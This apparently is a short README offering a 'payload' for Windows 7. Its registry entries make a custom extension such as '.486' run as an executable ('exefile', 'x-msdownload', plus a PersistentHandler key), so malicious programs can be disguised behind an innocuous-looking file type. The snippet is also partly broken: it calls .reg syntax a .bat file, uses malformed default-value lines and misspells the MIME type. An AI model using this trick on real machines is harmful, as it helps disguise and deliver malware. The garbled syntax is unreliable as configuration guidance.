# windows_reg_bat
Hey this is a simple .bat payload that changes the registry in windows 7 to make you own .exe equal file.

------------remove the comments including this and after when you make the script.bat file----------
##anything .486 or persistancehandler(just a reg local) you can change with in the slashes and brackets to make your own extension .486 examples have to be the same .whatever extension.
[HKEY_CLASSES_ROOT\.((486))]
""="exefile"
"Content Type"="applications/x-msdownload"
[HKEY_CLASSES_ROOT\.((486))\((PersistentHandler))]
"(Default)"="{098f2470-bae0-11cd-b579-08002b30bfeb}"
Got double brackets (()) to the upper to compare--------------------------
